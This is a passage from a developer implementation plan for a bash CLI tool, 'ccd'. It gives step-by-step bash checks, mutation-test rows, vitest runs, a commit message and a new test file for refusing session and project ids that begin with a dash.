      # same way). The `--session` arm refuses nothing: a lone key is arity's.
      --surface)   if [[ $# -lt 2 ]]; then
```

Replace the post-loop id check.

Before:
```bash
  [[ $id =~ ^[A-Za-z0-9._-]+$ ]] || _lc_refuse restore "$id" bad-session-id "bad session id"
```
After:
```bash
  _reg_id_ok "$id" || _lc_refuse restore "$id" bad-session-id "bad session id"
```

- [ ] **Step 8: Reword the mutant comment in `ccd-actor-flags.test.ts` (12 lines to 12; the assertion is unchanged)**

In the case `it('does NOT strip --reason: the hold reason is still positional and still mandatory', () => {`:

Before:
```ts
    // Fix round 1 on this task's review: the brief's own sample call here
    // never passed `--reason` at all, so this test refused identically with
    // or without a `--reason` case arm in the strip loop — vacuous against
    // the exact mutant it is paired with (reviewer measurement: 7 of 11
    // sibling tests in this block went red under that mutant, this one did
    // not). Fixed by making the call an actually-valid hold that INCLUDES
    // `--reason`: if the loop had a `--reason` arm, it would strip both
    // `--surface` and `--reason`+its value, leaving residue `--session <id>`
    // alone — arity 2 — and the exact-arity guard would refuse a call that
    // is really correct, making it impossible to hold a workspace with any
    // wave-5 flag present at all. Under real code this call succeeds; under
    // that mutant it refuses.
```
After:
```ts
    // Fix round 1 on this task's review: the brief's own sample call here
    // never passed `--reason` at all, so this test refused identically with
    // or without a `--reason` strip — vacuous against the exact mutant it is
    // paired with (reviewer measurement: 7 of 11 sibling tests in this block
    // went red under that mutant, this one did not). Fixed by making the call
    // an actually-valid hold that INCLUDES `--reason`. Since path-identity W1b
    // the loop HAS a `--reason` arm, but it keeps the pair IN the residue as
    // the positional key and value (path-identity spec §2.4). The mutant is
    // an arm that STRIPS it as a decision reason (`lc_reason="$2"; shift 2`):
    // the residue is then `--session <id>` alone, arity 2, and the exact-arity
    // guard refuses a correct call, so no workspace could be held at all.
    // Under real code this call succeeds; under that mutant it refuses.
```

- [ ] **Step 9: Restamp, then prove line neutrality and the counts**

```bash
bash ccd/ccrc restamp ccd/ccd && bash -n ccd/ccd && node shared/mark.mjs --check ccd/ccd; echo "stamp rc=$?"   # rc=0
test "$(git show HEAD:ccd/ccd | wc -l)" = "$(wc -l < ccd/ccd)" && echo "ccd/ccd line count unchanged"
test "$(git show HEAD:server/test/ccd-actor-flags.test.ts | wc -l)" = "$(wc -l < server/test/ccd-actor-flags.test.ts)" && echo "actor-flags line count unchanged"
# Every function in the file starts on its pre-task line (this task is line-neutral as a whole):
diff <(git show HEAD:ccd/ccd | awk '/^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{print NR, $1}') \
     <(awk '/^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{print NR, $1}' ccd/ccd) && echo "every start unmoved against HEAD"
# Every function above Task 1's insertion starts on its origin/main line (start-line-gate-split-at-task-1s-insert):
diff <(git show origin/main:ccd/ccd | awk '/^# THE ID A WITNESS MAY BE NAMED FOR/{exit} /^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{print NR, $1}') \
     <(awk '/^# THE ID A VERB MAY BIND/{exit} /^[A-Za-z_][A-Za-z0-9_]*\(\) *\{/{print NR, $1}' ccd/ccd) && echo "starts unmoved against origin/main above Task 1's insertion"
grep -cE '\[\[ \$id =~ \^\[A-Za-z0-9\._-\]\+\$ \]\]' ccd/ccd                         # 6 (was 10)
grep -cE '\[\[ ! \$id =~' ccd/ccd                                                    # 0 (was 1)
grep -cE '^      --session\)   if \(\( \$# >= 2 \)\); then lc_args\+=\("\$1" "\$2"\)' ccd/ccd   # 3: release, archive, restore
grep -cE '^      --session\|(--reason|--branch)\) if \(\( \$# >= 2 \)\); then lc_args\+=\("\$1" "\$2"\)' ccd/ccd   # 2: hold, rename
grep -c '_reg_id_ok "\$id"' ccd/ccd                                                  # 5, plus Task 2's three entry lines and Task 3's stop line: 9
# ccd-actor-flags.test.ts: only comment lines changed
git diff -U0 -- server/test/ccd-actor-flags.test.ts | grep -E '^[-+][^-+]' | grep -vE '^[-+] *//' || echo "only comments changed"
```

Expected: every `echo` prints, and the counts are as commented.
- The `_reg_id_ok "$id"` count is 9 only if Task 2 wrote its three entries as `_reg_id_ok "$id"` and Task 3 wrote its composed-id check as `_reg_id_ok "$id" || die "bad session id: $id"`. Record the measured value whatever it is.
- If either `diff` prints a line, a function moved. Find the edit that changed a line count and make it line-neutral. Never edit a census number. If an edit cannot be made line-neutral, STOP: R9's fallback needs the coordinator's recorded agreement.

- [ ] **Step 10: Run the tests green**

```bash
(cd server && ./node_modules/.bin/vitest run test/ccd-session-verbs-dash-id.test.ts test/ccd-actor-flags.test.ts)
```

Expected: PASS, all 12 new cases and every existing `ccd-actor-flags.test.ts` case, with that file's assertions unchanged.

- [ ] **Step 11: The citation census, and R9's ws-rename record**

```bash
(cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier')
```

Expected: PASS, with no number in `session-hook.test.ts` edited. `git diff --name-only -- server/test/session-hook.test.ts` prints nothing.

Then measure ws-rename's shifted span against the corpus, from the workspace root:

```bash
A=$(awk '/^cmd_ws_rename\(\) \{/{f=1} f && index($0, "WAVE 5 — THE DEC FLAGS, STRIPPED HERE"){print NR; exit}' ccd/ccd)
B=$(awk '/^cmd_ws_rename\(\) \{/{f=1} f && index($0, "--session|--branch) if"){print NR; exit}' ccd/ccd)
echo "ws-rename span: from line $A to line $B"
node -e '
const fs = require("fs");
const [a, b] = process.argv.slice(1).map(Number);
const docs = ["docs/superpowers/specs/2026-09-09-graphify-compaction-card-design.md",
              "docs/superpowers/plans/2026-09-10-graphify-compaction-card-plan-a.md", "README.md"];
let hits = 0;
for (const d of docs) fs.readFileSync(d, "utf8").split("\n").forEach((l, i) => {
  for (const m of l.matchAll(/:(\d+)(?:[-\u2013](\d+))?\b/g)) {
    const lo = Number(m[1]), hi = Number(m[2] ?? m[1]);
    if (hi >= a && lo <= b) { hits++; console.log(d + ":" + (i + 1) + ": " + m[0]); }
  }
});
console.log("anchors-in-span=" + hits);' "$A" "$B"
```

- Expected: `anchors-in-span=0`. The scan over-includes, because it counts a `:N` of any file.
- If it prints a hit, read it. A hit that names a file other than `ccd/ccd`, or that inherits another file's name, is not a corpus anchor on `ccd/ccd`. A `ccd/ccd` anchor in the span is a STOP: name it `rename-span-holds-a-corpus-anchor` and report the line.

Append the record to the SDD ledger, which is gitignored and never committed:

```bash
printf '%s\n' "Task 4 (R9, ws-rename exception): WAVE 5 comment start to the new arm spans line $A to line $B; corpus anchors in that span = 0 (node scan above); session-hook census passes green with no number edited." \
  >> .superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md
```

Run it in the same shell as the measurement above, or set `A` and `B` again first.

- [ ] **Step 12: The mutation rows (each measured red, then restored)**

Save the green, restamped file once:

```bash
mkdir -p "${TMPDIR:-/tmp}/ccrc-w1b-task4" && cp ccd/ccd "${TMPDIR:-/tmp}/ccrc-w1b-task4/ccd.green"
```

For each row:
1. Apply the mutation from the workspace root.
2. Run the command. Each one is its own call, in a subshell so the cwd stays at the workspace root for the mutation and the restore: `(cd server && ./node_modules/.bin/vitest run …)`.
3. See the expected red.
4. Restore with `cp "${TMPDIR:-/tmp}/ccrc-w1b-task4/ccd.green" ccd/ccd`.

| # | Mutation | Command | Expected red |
|---|---|---|---|
| 1 | Delete ws-release's arm: `sed -i '/^cmd_ws_release() {/,/^}/{/^      --session)   if (( \$# >= 2 ));/d;}' ccd/ccd` | `test/ccd-session-verbs-dash-id.test.ts -t 'ws-release binds'` | both ws-release cases: exit 0 with `released agent`, and `agent`'s hold is gone |
| 2 | Delete ws-archive's arm: `sed -i '/^cmd_ws_archive() {/,/^}/{/^      --session)   if (( \$# >= 2 ));/d;}' ccd/ccd` | `… -t 'ws-archive binds'` | `archived agent …` at exit 0, and `agent.archived` is written |
| 3 | Delete ws-restore's arm: `sed -i '/^cmd_ws_restore() {/,/^}/{/^      --session)   if (( \$# >= 2 ));/d;}' ccd/ccd` | `… -t 'ws-restore binds'` | a `not-archived` row names `agent`, and `.reap-agent.lock` exists |
| 4 | Delete ws-hold's arm: `sed -i '/^cmd_ws_hold() {/,/^}/{/^      --session|--reason) if/d;}' ccd/ccd` | `… -t 'ws-hold binds'` | the `--actor`/`--surface` case (usage line), and the reason case (`held demo-quiet-basin: agent`) |
| 5 | Delete ws-rename's arm: `sed -i '/^cmd_ws_rename() {/,/^}/{/^      --session|--branch) if/d;}' ccd/ccd` | `… -t 'ws-rename binds'` | the `--actor`/`--surface`/`--reason` case (the usage detail) |
| 5b | ws-rename's arm pattern loses its `--branch` alternative, leaving `--session)` | `… -t 'ws-rename binds'` | "a --branch value spelled as a flag…": `invalid branch name: agent` where `invalid branch name: --actor` is expected |
| 6 | Delete ws-release's `_reg_id_ok` call: `sed -i '/^cmd_ws_release() {/,/^}/{/^  _reg_id_ok "\$id" || die "bad session id"$/d;}' ccd/ccd` | `… -t 'ws-release binds'` | `a planted dash-leading row is never acted on`: `released --actor`, and the planted hold is gone |
| 7 | Make ws-hold's arm refuse a dash-leading value: `sed -i 's/^      --session|--reason) if (( \$# >= 2 )); then /      --session|--reason) [[ ${2-} != -* ]] \|\| die "bad session id"; if (( $# >= 2 )); then /' ccd/ccd` | `… -t 'narrow nothing else\|ws-hold binds'` | `prose may lead with a dash` (`--program:x wave:1/4` is refused) and the flag-spelled hold reason case |
| 8 | Make ws-hold's arm STRIP `--reason` as a decision reason: `sed -i 's/^      --session|--reason) if (( \$# >= 2 )); then /      --session|--reason) if [[ $1 == --reason \&\& $# -ge 2 ]]; then shift 2; elif (( $# >= 2 )); then /' ccd/ccd` | `test/ccd-actor-flags.test.ts -t 'does NOT strip --reason'` | the case refuses with `usage: ccd ws-hold …` (this proves Step 8's reworded comment) |
| 9 | Insert one blank line inside ws-restore's window: `awk '{print} /^cmd_ws_restore\(\) \{/{f=1} f && !d && /# FIX ROUND 3 \(operator escalation/{print ""; d=1}' ccd/ccd > "${TMPDIR:-/tmp}/ccrc-w1b-task4/ccd.mut" && cp "${TMPDIR:-/tmp}/ccrc-w1b-task4/ccd.mut" ccd/ccd` | `test/session-hook.test.ts -t 'CITATION DEBT\|README HAS ITS OWN CENSUS\|LOCATION INDEXES\|ROW PASS\|RANGE BOUND\|backticked _identifier'` | at least one census pass goes red (its exact count or set changes). If every pass stays green, report `census-blind-at-ws-restore` |
| 10 | In `cmd_ws_archive`, the post-loop check's `_reg_id_ok "$id"` becomes `[[ $id =~ ^[A-Za-z0-9._-]+$ ]]` (the dash rule dropped; its `die` and the arm stay) | `… -t 'ws-archive binds'` | the planted `--actor` row binds as the literal id and goes on past the id check (archived, or refused by a later rung), not `ccd: bad session id` |
| 11 | In `cmd_ws_restore`, the post-loop check's `_reg_id_ok "$id"` becomes `[[ $id =~ ^[A-Za-z0-9._-]+$ ]]` (its `_lc_refuse` stays) | `… -t 'ws-restore binds'` | the planted `--actor` row answers `ccd: not archived: --actor`, `.reap---actor.lock` is created, and the refusal rows are no longer all `bad-session-id` |
| 12 | In `cmd_ws_hold`, the post-loop check's `_reg_id_ok "$id"` becomes `[[ $id =~ ^[A-Za-z0-9._-]+$ ]]` | `… -t 'ws-hold binds'` | "an id of --reason…": the planted `--reason` row is held (`held --reason: program:x wave:1/4`) |
| 13 | In `cmd_ws_rename`, `if ! _reg_id_ok "$id"; then` becomes `if [[ ! $id =~ ^[A-Za-z0-9._-]+$ ]]; then` | `… -t 'ws-rename binds'` | "an id of --branch…": the planted `--branch` row passes the id check, and the answer is a later one, not `bad session id: --branch` |
| 14 | ws-hold's arm pattern loses its `--reason` alternative, leaving `--session)` | `… -t 'ws-hold binds'` | "a hold reason the server spells as a flag…": `held demo-quiet-basin: agent`, the surface word, where `--surface` is expected |

- Rows 7 and 9 are written with `\|` inside the table only; type them with a bare `|`. The sed replacement in row 7 is `[[ ${2-} != -* ]] || die "bad session id"; if (( $# >= 2 )); then `, and row 9's `-t` pattern is the one in Step 11.
- Before each run, check that the mutation landed: `cmp -s ccd/ccd "${TMPDIR:-/tmp}/ccrc-w1b-task4/ccd.green" && echo "MUTATION DID NOT APPLY"` must print nothing. A row whose mutation did not apply is re-applied, never counted.

After the last row:

```bash
cp "${TMPDIR:-/tmp}/ccrc-w1b-task4/ccd.green" ccd/ccd
cmp ccd/ccd "${TMPDIR:-/tmp}/ccrc-w1b-task4/ccd.green" && node shared/mark.mjs --check ccd/ccd && bash -n ccd/ccd && echo "restored"
rm -rf "${TMPDIR:-/tmp}/ccrc-w1b-task4"
```

Record each row's measured red, as the failing case names, in the SDD ledger.

- [ ] **Step 13: The gates (run unedited; each green)**

```bash
cd server && ./node_modules/.bin/vitest run test/ccd-session-verbs-dash-id.test.ts test/ccd-actor-flags.test.ts test/ccd-reg-id-ok.test.ts test/ccd-hold.test.ts test/ccd-ws-rename.test.ts test/ccd-archive.test.ts test/ccd-restore-reap-lock.test.ts test/ccd-ws-restore-supersede.test.ts test/ccd-lifecycle-sites.test.ts test/ccd-lifecycle-pairs.test.ts test/ccd-refusal-scan.test.ts test/ccd-die-containment.test.ts test/wsaudit.test.ts test/ccd-wsaudit-nonpoison.test.ts test/archive-ccd-words.test.ts test/ccdargv-dec-parity.test.ts test/ownership.test.ts test/mark-check.test.ts
```
```bash
# Every other suite that calls one of the five verbs (measured at the export: grep -lE 'cmd_ws_(release|archive|restore|hold|rename) ' server/test/*.test.ts). ccd-ws-gc and ccd-bounded-reads are CLAUDE.md load flakes: re-run alone before calling a red a break.
(cd server && ./node_modules/.bin/vitest run test/ccd-prhistory.test.ts test/ccd-lifecycle-purge.test.ts test/ccd-ws-audit.test.ts test/ccd-ws-expire-spawn.test.ts test/ccd-unarchive-on-spawn.test.ts test/ccd-ws-reap.test.ts test/ccd-operator-choice.test.ts)
(cd server && ./node_modules/.bin/vitest run test/ccd-workspaces.test.ts)
(cd server && ./node_modules/.bin/vitest run test/ccd-ws-gc.test.ts test/ccd-bounded-reads.test.ts)
```
```bash
cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier'
```
```bash
cd server && ./node_modules/.bin/vitest run test/typecheck-tests.test.ts
```

Expected: all PASS.
- `ccd-refusal-scan` still counts 16 `SANCTIONED` dies: no bare `die "` was added to `cmd_ws_restore`'s body.
- `wsaudit` and `ccd-wsaudit-nonpoison` see no new token: rename reuses `bad-args`.
- The danglers pass resolves `_reg_id_ok` and `_json_str` in the new comments.
- `typecheck-tests` is a known load flake. Re-run it alone before calling a red a break.
- Any existing file that goes red is NOT edited. Name it by slug and STOP for a coordinator ruling (HARD BOUNDARY).

- [ ] **Step 14: Commit**

```bash
git add ccd/ccd server/test/ccd-session-verbs-dash-id.test.ts server/test/ccd-actor-flags.test.ts
git diff --cached --name-only        # exactly those three paths
git commit -F - <<'EOF'
fix(ccd): the five --session verbs take their identity pair whole (line-neutral)

ws-release, ws-archive, ws-restore, ws-hold and ws-rename each gain one
identity arm, first in the loop's case: --session (and ws-hold's positional
--reason, ws-rename's --branch) is appended to the residue together with its
value, or alone when no value follows. A value is never scanned again as a
flag, so the server's `--session --actor --surface agent --actor sweep` no
longer binds the surface word `agent` as the id. No arm refuses anything:
each verb's exact-arity rule still refuses a duplicate, a wrong order and a
lone key with today's words, and the dec ladder still runs before arity.

Each post-loop id check is now _reg_id_ok, which refuses a leading dash;
ws-restore keeps its _lc_refuse bad-session-id dialect and ws-rename its
JSON bad-args answer. Prose given to --actor, --reason and the hold reason may
still begin with a dash, and a hold reason spelled like a flag is now held
verbatim instead of being eaten by the --surface arm.

Line-neutral above the frozen citation corpus: each arm's line is paid for by
folding one comment line in the same function (the arity comment in
ws-release, ws-archive and ws-hold, the FIX ROUND 3 comment in ws-restore,
and the WAVE 5 paragraph in ws-rename). Every function keeps its start line,
and the census passes stay green with no number edited.

ccd-actor-flags.test.ts: the "does NOT strip --reason" case's mutant comment
is reworded for the new arm; its assertion is unchanged.

Path-identity spec sections 2.2 and 2.4. Restamped with the checkout's own tool.
EOF
```

---

### Task 5: Predicates: a project or temp-root id never begins with "-", and enable validates its project

**Model routing:** `opus`, effort `high`.

**Why:** the only way ccd can mint a flag-spelled id is a dash-leading project: project `-` plus slug `actor` gives `--actor` (spec §2.4). SEC3 and SEC4 close it at `_ws_project_valid`. `_ws_tmproot_id_ok` is re-derived from Task 1's `_reg_id_ok`, so the witness, the records, the slots, ws-collect and the collect audit refuse a dash-leading id through one spelling of the dash rule. R11: `cmd_enable`'s two-argument form asks the same predicate before it journals, and ahead of it `cmd_start`'s own wrapper check, words and all, so neither an unrostered or flag-spelled wrapper nor a bad project leaves a journal line or a reap lock for an id nothing created (coordinator ruling). R7: this lands before ws-add's task (Task 6).

**Files:**
- Modify `ccd/ccd`, with every edit located by content. Then restamp.
  - The creation-sites header above `_ws_project_valid`. The two lines starting `# Enforced at CREATION ONLY — \`cmd_ws_add\` and \`cmd_start\`, the two sites` are rewritten line for line to add `cmd_enable`. Above the anchors; line-neutral.
  - `_ws_project_valid() {`. The asymmetry paragraph inside its header goes from seven lines to six, including one new dash line. A new `[[ "$1" != -* ]] || return 1` line goes after the dot line. The charset line and the dot line stay verbatim. The function stays at 17 lines.
  - `cmd_ws_add`. The die line containing `and no LEADING dot (a dot-leading id aliases` is edited in place.
  - `cmd_project_pool`. The die line containing `and no LEADING dot (the tag is a file in $POOLS_DIR` is edited in place.
  - `_ws_tmproot_id_ok`. Its two comment lines (`# THE ID A WITNESS MAY BE NAMED FOR…`) and its definition line are rewritten, two lines to two and one to one. The heading phrase stays first on its line, because Task 7 inserts above it.
  - `cmd_start`. The die line `|| die "invalid project '$project' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot"` is edited in place.
  - `cmd_enable`. A four-line comment and a four-line `if` block (the wrapper check, then the project check) go directly after `local id; if [[ $# -ge 2 ]]; then id=$(_id "$1" "$2"); else id="$1"; fi`, before `# TWO EVENTS, NOT ONE.` and `_ws_expire_refuse_return`. This is below `cmd_start()`, so lines may be added.
- Modify `ccd/ccrc-doctor-checks`. Inside `_check_pools`, the comment lines from `` # `_ws_project_valid`'s own (`ccd:3685`, `` to `` # dot-leading), so no name `ccd` `` are rewritten. Six lines stay six.
- Modify `server/test/pool-name-parity.test.ts`:
  - the PROJECT-NAME header prose, in three spans;
  - the describe title;
  - the exact-table comment, and its `'-lead'` row;
  - one new `it` holding the one new dash-line assertion;
  - the "leading-dash ones" case, retitled and rewritten;
  - the "two ENDS" section comment;
  - the "ccd really creates" case, inverted;
  - the first sentences of the hostile-name case's comment, which the inversion makes false.
- Modify `server/test/ccd-workspaces.test.ts`. One comment line, in place: `` // `_ws_project_valid` accepts, so the verb would die at the not-a-git-repo ``.
- Modify `server/test/ccd-project-pool.test.ts`. The one case titled "a leading --cross-pool on `enable` now journals the REAL id, because the strip runs before `_id`" is replaced whole (Step 2i). It pins the `enable` row that the wrapper check removes.
- Create `server/test/ccd-project-dash.test.ts`.

**Interfaces:**
- Consumes:
  - `_reg_id_ok WORD` (Task 1; `ccd/ccd`, directly above `# THE ID A WITNESS MAY BE NAMED FOR`). rc 0 iff WORD matches `^[A-Za-z0-9._-]+$` under `LC_ALL=C` and does not begin with `-`.
  - From `server/test/ccdWsHelpers.ts`: `makeCcdHarness(prefix: string): CcdHarness`, `type CcdHarness` (`sh`, `calls`, `git`, `makeRepo`, `home`, `cleanup`), `WS_ADD: string` and `CCD: string`.
  - From `server/test/lifecycleHelpers.ts`: `readJournal(home: string): Record<string, unknown>[]` and `eventsOf(home: string, act: string): Record<string, unknown>[]`.
  - From `shared/api.ts`, read-only: `isTmpRootId(id: unknown): id is string`.
  - `pool-name-parity.test.ts`'s own `ccdValidFn`, `omitPattern`, `measurePair`, `NAMES`, `POOLS_DIR_NAME` and `makeCcdHarness`, all unchanged.
- Produces:
  - `_ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }   # id -> 0 iff a witness, a token verb or its audit may name it`
  - `_ws_project_valid`'s fourth body line: `  [[ "$1" != -* ]] || return 1`
  - `cmd_enable`'s wrapper check, first in the same block: `_is_valid_wrapper "$1" || die "unknown wrapper '$1' (valid: ${CCRC_ACCOUNTS[*]})"` (`cmd_start`'s own check and literal)
  - `cmd_enable`'s project check, ahead of `_ws_expire_refuse_return`: `_ws_project_valid "$2" || die "invalid project '$2' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash"`

- [ ] **Step 0: Entry conditions (Tasks 1 to 4 are committed; measure, never assume)**

Run from the workspace root:

```bash
grep -c '^_reg_id_ok() {' ccd/ccd                                                                   # (a) 1: Task 1 is in
grep -cF '_ws_tmproot_id_ok() { local LC_ALL=C; [[ "${1-}" =~ ^[A-Za-z0-9._-]+$ && "${1-}" != .* ]]; }' ccd/ccd   # (b) 1: the old body
grep -cF 'and no LEADING dot' ccd/ccd                                                               # (c) 3: ws-add, project-pool, start
grep -cF 'no LEADING dot or dash' ccd/ccd                                                           # (d) 0
grep -cF 'local id; if [[ $# -ge 2 ]]; then id=$(_id "$1" "$2"); else id="$1"; fi' ccd/ccd          # (e) 1: cmd_enable's id line
grep -n '^# Enforced at CREATION ONLY' ccd/ccd; git show origin/main:ccd/ccd | grep -n '^# Enforced at CREATION ONLY'   # (f) the same number twice
for f in _ws_project_valid cmd_ws_add cmd_project_pool; do
  echo "$f origin=$(git show origin/main:ccd/ccd | grep -n "^$f() {" | cut -d: -f1) head=$(grep -n "^$f() {" ccd/ccd | cut -d: -f1)"
done                                                                                                # (g) origin equals head on each line
grep -cF "'-lead': 'accept omit'," server/test/pool-name-parity.test.ts                             # (h) 1
grep -cF '`_ws_project_valid` accepts, so the verb would die at the not-a-git-repo' server/test/ccd-workspaces.test.ts   # (i) 1
grep -E '(^| )dash=|uuid-dash=|uuid-dot=|reap-dash=|reap-dot=|reap-nodash=|tmproots-nodash=|tmpquarantine-nodash=' \
  .superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/progress.md                        # (j) Task 0's STOP counts, both boxes
(cd server && ./node_modules/.bin/vitest run test/session-hook.test.ts -t 'CITATION DEBT|README HAS ITS OWN CENSUS|LOCATION INDEXES|ROW PASS|RANGE BOUND|backticked _identifier')   # (k) PASS
```

- (j) must show Task 0's Step 4 lines for both boxes, with every listed count at 0. If any is non-zero, or the server box's lines are missing, **STOP**. Do not edit `_ws_project_valid` or `_ws_tmproot_id_ok` (R25), and report the counts, never names.
- Any other check that does not print what its comment states is also a **STOP**. Report it by its letter.
- A line number that differs from a hint is not a STOP.

- [ ] **Step 1: Write the failing test file, `server/test/ccd-project-dash.test.ts`**

```ts
// A PROJECT OR A TEMP-ROOT ID NEVER BEGINS WITH "-" (path-identity spec §2.4).
// A dash-leading project is the one path by which ccd could mint an id spelled
// as a flag: project `-` with slug `actor` is `--actor`. So `_ws_project_valid`
// refuses a leading `-` at every site that creates under a project: ws-add,
// start, enable (which now asks, its wrapper first, before it journals) and
// project-pool. And
// `_ws_tmproot_id_ok` is re-derived from `_reg_id_ok`, so the witness, the
// records, the slots, ws-collect and its audit refuse a dash-leading id through
// one spelling of the dash rule. It agrees with the server's `isTmpRootId` on
// every name but length.
// FIXTURE HOME ONLY (`makeCcdHarness`). Every ccd call goes through `h.sh`, so
// this file spawns no bash of its own.
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { CCD, WS_ADD, makeCcdHarness, type CcdHarness } from './ccdWsHelpers.js';
import { eventsOf, readJournal } from './lifecycleHelpers.js';
import { isTmpRootId } from '../../shared/api.js';

let h: CcdHarness;
beforeEach(() => { h = makeCcdHarness('ccrc-project-dash-'); });
afterEach(() => { h.cleanup(); });

/** `ccd-start-id.test.ts`'s stubs, copied rather than imported. `_supervised_start` logs its argv to
 *  `$HOME/ccd-calls` instead of reaching a manager, and `_alive` answers "no", so a start that is NOT
 *  refused leaves a `supervised_start` line behind. */
const START_STUBS = `_supervised_start() { echo "supervised_start $*" >> "$HOME/ccd-calls"; }; `
  + `_alive() { return 1; };`;

interface ShResult { code: number; stdout: string; stderr: string }

/** `h.sh`, with a refusal captured rather than thrown. */
const shFail = (snippet: string): ShResult => {
  try {
    return { code: 0, stdout: h.sh(snippet), stderr: '' };
  } catch (e) {
    const err = e as { status?: number | null; stdout?: string | Buffer; stderr?: string | Buffer };
    return { code: err.status ?? 1, stdout: String(err.stdout ?? ''), stderr: String(err.stderr ?? '') };
  }
};

const regDir = (): string => path.join(h.home, '.cc-sessions');
const reapLocks = (): string[] => fs.readdirSync(regDir()).filter((f) => f.startsWith('.reap-')).sort();
const startedIds = (): string[] =>
  h.calls().filter((l) => l.startsWith('supervised_start ')).map((l) => l.split(' ')[1] ?? '');

describe('a project or temp-root id never begins with "-" (path-identity spec §2.4)', () => {
  it('_ws_project_valid refuses -lead and --reason, and still refuses .hidden', () => {
    const out = h.sh(`for p in demo a-b p.v2 -lead --reason .hidden; do
  if _ws_project_valid "$p"; then printf '%s accept\\n' "$p"; else printf '%s refuse\\n' "$p"; fi
done`);
    expect(out.split('\n')).toEqual([
      'demo accept', 'a-b accept', 'p.v2 accept', '-lead refuse', '--reason refuse', '.hidden refuse',
    ]);
  });

  it('ws-add refuses a dash-leading project positionally, with no row and no worktree', () => {
    // POSITIONAL: ws-add's loop has no arm for `-lead`, so its catch-all binds it as the project.
    const main = h.makeRepo('-lead');
    const r = shFail(`${WS_ADD} cmd_ws_add -lead quiet-basin`);
    expect(r.code, r.stdout).not.toBe(0);
    expect(r.stderr).toContain("invalid project '-lead'");
    expect(fs.existsSync(path.join(regDir(), '-lead-quiet-basin.uuid')), 'a row was written').toBe(false);
    expect(fs.existsSync(path.join(h.home, 'worktrees', '-lead', 'quiet-basin')), 'a worktree was added').toBe(false);
    expect(fs.existsSync(path.join(regDir(), '.ws-add--lead.lock')), 'refused after the ws-add lock').toBe(false);
    expect(h.git(main, 'branch', '--list', 'ws/quiet-basin'), 'a ws/ branch was cut').toBe('');
  }, 60_000);

  it('start refuses a dash-leading project, with no row and no supervised start', () => {
    fs.mkdirSync(path.join(h.home, 'projects', '-lead'), { recursive: true });
    const r = shFail(`${START_STUBS} cmd_start claude-b -lead`);
    expect(r.code, r.stdout).not.toBe(0);
    expect(r.stderr).toContain("invalid project '-lead'");
    expect(fs.existsSync(path.join(regDir(), 'claude-b--lead.uuid')), 'a row was written').toBe(false);
    expect(startedIds(), 'a supervised start was asked for').toEqual([]);
    // The CONTROL: the same stubs start a plain project, so an empty call log is the refusal's, not the stubs'.
    fs.mkdirSync(path.join(h.home, 'projects', 'demo'), { recursive: true });
    expect(shFail(`${START_STUBS} cmd_start claude-b demo`).code).toBe(0);
    expect(startedIds()).toEqual(['claude-b-demo']);
  }, 60_000);

  it('enable refuses a dash- or dot-leading project before it journals', () => {
    for (const p of ['-lead', '.hidden']) {
      fs.mkdirSync(path.join(h.home, 'projects', p), { recursive: true });
      // An archive marker planted for the composed id. The check must precede `_ws_expire_refuse_return`: that gate
      // opens a permanent `.reap-<id>.lock` for an archived id and clears its archive, journaling `unarchive`.
      fs.writeFileSync(path.join(regDir(), `claude-b-${p}.archived`), '1700000000\n');
      const r = shFail(`${START_STUBS} cmd_enable claude-b ${p}`);
      expect(r.code, `${p}: ${r.stdout}`).not.toBe(0);
      expect(r.stderr, p).toContain(`invalid project '${p}'`);
      expect(readJournal(h.home).filter((e) => e['id'] === `claude-b-${p}`), `${p}: a journal row names the id`)
        .toEqual([]);
      expect(fs.existsSync(path.join(regDir(), `claude-b-${p}.archived`)), `${p}: the planted archive marker was cleared`)
        .toBe(true);
    }
    expect(reapLocks(), 'a reap lock was opened for a refused id').toEqual([]);
    expect(eventsOf(h.home, 'enable'), 'an enable row was journaled').toEqual([]);
    expect(startedIds(), 'a supervised start was asked for').toEqual([]);
    // The CONTROL: a plain project journals exactly one enable row, so the reader above can see one.
    fs.mkdirSync(path.join(h.home, 'projects', 'demo'), { recursive: true });
    expect(shFail(`${START_STUBS} cmd_enable claude-b demo`).code).toBe(0);
    expect(eventsOf(h.home, 'enable').map((e) => e['id'])).toEqual(['claude-b-demo']);
  }, 60_000);

  it('enable refuses an unrostered or flag-spelled wrapper before it journals or locks', () => {
    // `cmd_start` refuses the same wrapper with the same words, but only after enable's expiry gate and its
    // `enable` line. enable's loop has no arm for `--actor`, so its catch-all binds it positionally and the
    // composed id is `--actor-demo`.
    fs.mkdirSync(path.join(h.home, 'projects', 'demo'), { recursive: true });
    for (const w of ['acct-unrostered', '--actor']) {
      const id = `${w}-demo`;
      // An archive marker planted for the composed id, as in the project case above: past the check, the expiry
      // gate would open a permanent `.reap-<id>.lock` and clear the archive, journaling `unarchive`.
      fs.writeFileSync(path.join(regDir(), `${id}.archived`), '1700000000\n');
      const r = shFail(`${START_STUBS} cmd_enable ${w} demo`);
      expect(r.code, `${w}: ${r.stdout}`).not.toBe(0);
      expect(r.stderr, w).toContain(`unknown wrapper '${w}'`);
      expect(readJournal(h.home).filter((e) => e['id'] === id), `${w}: a journal row names the id`).toEqual([]);
      expect(fs.existsSync(path.join(regDir(), `${id}.archived`)), `${w}: the planted archive marker was cleared`)
        .toBe(true);
    }
    expect(reapLocks(), 'a reap lock was opened for a refused id').toEqual([]);
    expect(eventsOf(h.home, 'enable'), 'an enable row was journaled').toEqual([]);
    expect(startedIds(), 'a supervised start was asked for').toEqual([]);
    // The CONTROL: a rostered wrapper on the same project journals exactly one enable row.
    expect(shFail(`${START_STUBS} cmd_enable claude-b demo`).code).toBe(0);
